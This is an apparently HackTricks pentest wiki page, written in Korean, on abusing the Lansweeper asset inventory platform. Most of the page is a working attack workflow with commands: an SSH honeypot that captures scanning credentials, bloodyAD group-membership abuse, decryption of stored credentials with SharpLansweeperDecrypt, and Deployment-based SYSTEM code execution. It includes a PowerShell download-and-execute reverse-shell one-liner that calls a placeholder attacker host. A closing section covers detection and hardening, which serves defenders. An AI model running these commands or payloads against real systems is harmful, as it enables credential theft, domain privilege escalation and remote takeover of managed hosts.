# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper는 Windows에 일반적으로 배포되고 Active Directory와 통합되는 IT asset discovery 및 inventory platform입니다. Lansweeper에 구성된 Credentials는 SSH, SMB/WMI, WinRM과 같은 protocol을 통해 asset에 인증하기 위해 scanning engine에서 사용됩니다. 잘못된 구성으로 인해 다음과 같은 문제가 자주 발생합니다:

- scanning target을 attacker-controlled host(honeypot)로 redirect하여 credential interception
- Lansweeper 관련 group에서 노출된 AD ACL을 악용하여 remote access 획득
- 호스트에서 Lansweeper에 구성된 secrets(connection strings 및 저장된 scanning credentials) decryption
- Deployment 기능을 통해 관리되는 endpoint에서 code execution(대개 SYSTEM 권한으로 실행)

이 페이지는 engagement 중 이러한 동작을 악용하기 위한 실용적인 attacker workflow와 command를 요약합니다.

## 1) honeypot을 통한 scanning credentials 수집(SSH 예시)

아이디어: 사용자의 host를 가리키는 Scanning Target을 생성하고 기존 Scanning Credentials를 해당 target에 매핑합니다. scan이 실행되면 Lansweeper는 해당 credentials로 인증을 시도하며, honeypot은 이를 capture합니다.<sup>[[1]](#references)</sup>

Steps overview(web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range(또는 Single IP) = 사용자의 VPN IP
- 접근 가능한 SSH port로 구성(예: 22가 차단된 경우 2022)
- schedule을 disable하고 수동으로 trigger하도록 계획
- Scanning → Scanning Credentials → Linux/SSH creds가 존재하는지 확인하고 새 target에 매핑(필요에 따라 모두 enable)
- target에서 “Scan now” 클릭
- SSH honeypot을 실행하고 시도된 username/password 확인

sshesame 사용 예시:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
캡처한 creds를 DC 서비스에서 검증:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- 다른 프로토콜은 동등하지 않습니다. SMB/WinRM listener는 일반적으로 cleartext password가 아닌 NTLM challenge-response를 획득합니다. 이를 cracking하거나 relaying할 수 있는지는 협상된 프로토콜 보호 기능에 따라 달라집니다. 자세한 내용은 [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)를 참조하세요. SSH password authentication은 일반적으로 가장 단순한 cleartext 사례입니다.
- SSH public-key authentication은 username과 public-key fingerprint를 server에 노출하지만, **private key나 해당 passphrase는 노출하지 않습니다.** honeypot이 이를 공개할 것으로 기대하지 말고, 침해된 Lansweeper server에서 key-backed credentials를 복구하세요.<sup>[[2]](#references)</sup>
- 많은 scanner는 고유한 client banner(예: RebexSSH)로 자신을 식별하며, 무해한 command(uname, whoami 등)를 실행하려고 합니다.

### Credential selection order matters

rescan 시 Lansweeper는 먼저 해당 asset에서 마지막으로 성공한 credential을 다시 시도한 다음, 설정된 순서에 따라 명시적으로 매핑된 credentials를 시도하고, 마지막으로 동일한 type의 global credential을 시도합니다. 따라서 첫 번째 password authentication을 허용하는 honeypot은 일반적으로 이후의 fallback credentials를 관찰하지 못합니다. 완전한 fallback sequence를 확인하는 것이 목적인 authorized credential-path assessment에서는 시도를 log하고 거부하세요.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: app-admin group에 자신을 추가하여 remote access 획득

BloodHound를 사용하여 침해된 account의 effective rights를 열거하세요. 일반적인 finding은 scanner 또는 app 전용 group(예: “Lansweeper Discovery”)이 privileged group(예: “Lansweeper Admins”)에 대해 GenericAll을 보유하는 경우입니다. privileged group이 “Remote Management Users”의 member이기도 하다면, 자신을 추가하는 즉시 WinRM을 사용할 수 있게 됩니다.<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD를 사용하여 그룹에 대한 GenericAll 악용 (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
그런 다음 interactive shell을 획득합니다:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
팁: Kerberos 작업은 시간에 민감합니다. KRB_AP_ERR_SKEW 오류가 발생하면 먼저 DC와 시간을 동기화하세요:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 호스트에서 Lansweeper-configured secrets 복호화

Lansweeper server에서 ASP.NET site는 일반적으로 암호화된 connection string과 애플리케이션에서 사용하는 symmetric key를 저장합니다. 적절한 local access 권한이 있으면 DB connection string을 복호화한 후 저장된 scanning credentials를 추출할 수 있습니다.<sup>[[1]](#references)</sup>

일반적인 위치:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecrypt를 사용하면 저장된 creds의 복호화와 dumping을 자동화할 수 있습니다. 인수 없이 실행하면 현재 executable이 `web.config`를 복호화하고 database에 연결한 다음 구성된 모든 scanning credentials를 dumping합니다. `-e`는 encrypted value와 key file을 이미 사용할 수 있는 경우 offline/manual decryption도 지원합니다:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
예상 출력에는 DB 연결 세부 정보와 환경 전반에서 사용되는 Windows 및 Linux 계정과 같은 평문 scanning 자격 증명이 포함됩니다. 이러한 계정은 도메인 호스트에서 로컬 권한이 상승되어 있는 경우가 많습니다:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
복구한 Windows scanning creds를 권한 있는 액세스에 사용:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins”의 구성원인 경우 웹 UI에 Deployment 및 Configuration이 표시됩니다. Deployment → Deployment packages에서 대상 asset에 임의의 명령을 실행하는 package를 생성할 수 있습니다. Lansweeper는 administrative scanning credential을 사용해 대상의 Task Scheduler와 `C$`에 접근한 다음, deployment를 위한 task를 생성합니다. package에서 **System Account** run mode를 사용하면 payload가 `NT AUTHORITY\SYSTEM`으로 실행됩니다. 다른 run mode에서는 매핑된 scanning credential 또는 현재 로그인한 사용자를 사용할 수 있으므로, SYSTEM이라고 가정하지 말고 선택한 mode를 확인해야 합니다.<sup>[[1]](#references)[[7]](#references)</sup>

High-level steps:
- PowerShell 또는 cmd one-liner(reverse shell, add-user 등)를 실행하는 새로운 Deployment package를 생성합니다.
- 원하는 asset(예: Lansweeper가 실행 중인 DC/host)을 대상으로 지정하고 Deploy/Run now를 클릭합니다.
- SYSTEM 권한으로 shell을 수신합니다.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment 작업은 시끄럽고 Lansweeper 및 Windows event log에 로그를 남깁니다. 신중하게 사용하세요.

### Deployment artifacts와 두 번째 credential 노출 지점

Scanner는 `C$`를 통해 `C:\Windows\LSDeployment` 아래에 deployment executable을 작성합니다. Package 파일은 일반적으로 `C:\Program Files (x86)\Lansweeper\PackageShare`를 기반으로 하는 `DefaultPackageShare$` 또는 IP range별 package share에서 읽습니다. 특히 Lansweeper는 package-share credential이 **deployment를 받는 모든 컴퓨터의 registry에 되돌릴 수 있는 암호화 형식으로 저장된다**고 문서화하고 있습니다. 침해된 managed endpoint를 해당 share account의 잠재적인 disclosure 지점으로 간주하고, Lansweeper activity를 재구성할 때 deployment directory, scheduled-task history 및 구성된 package share를 점검하세요.<sup>[[7]](#references)</sup>

## Detection and hardening

- 익명 SMB enumeration을 제한하거나 제거하세요. RID cycling 및 Lansweeper share에 대한 비정상적인 access를 모니터링하세요.
- Egress controls: scanner host에서 outbound SSH/SMB/WinRM을 차단하거나 엄격하게 제한하세요. 비표준 port(예: 2022) 및 Rebex와 같은 비정상적인 client banner에 alert를 설정하세요.
- `Website\\web.config` 및 `Key\\Encryption.txt`를 보호하세요. Secret을 vault로 externalize하고 노출 시 rotate하세요. 가능한 경우 최소 privilege를 가진 service account와 gMSA를 고려하세요.
- AD monitoring: Lansweeper 관련 group(예: “Lansweeper Admins”, “Remote Management Users”)의 변경 및 privileged group에 GenericAll/Write membership을 부여하는 ACL 변경에 alert를 설정하세요.
- Deployment package의 생성/변경/실행을 audit하고, 새로운 remote scheduled task를 `C:\Windows\LSDeployment`에 대한 write와 correlate하세요. `cmd.exe`/`powershell.exe`를 spawn하거나 예상치 못한 outbound connection을 생성하는 package에 alert를 설정하세요.
- Package-share credential에는 **Read & Execute** permission만 부여하고 administration에 재사용하지 마세요. 가능한 경우 agent-based inventory를 우선 사용하세요. 모든 컴퓨터를 agent로 scan하고 deployment module을 사용하지 않는 경우 Lansweeper는 저장된 computer scanning credential을 요구하지 않습니다.<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration 및 RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication 및 clock-skew 고려 사항](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [WinRM 사용 및 lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Lansweeper Scanning, AD ACLs 및 Secrets를 악용해 DC 장악하기 (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Create and map scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
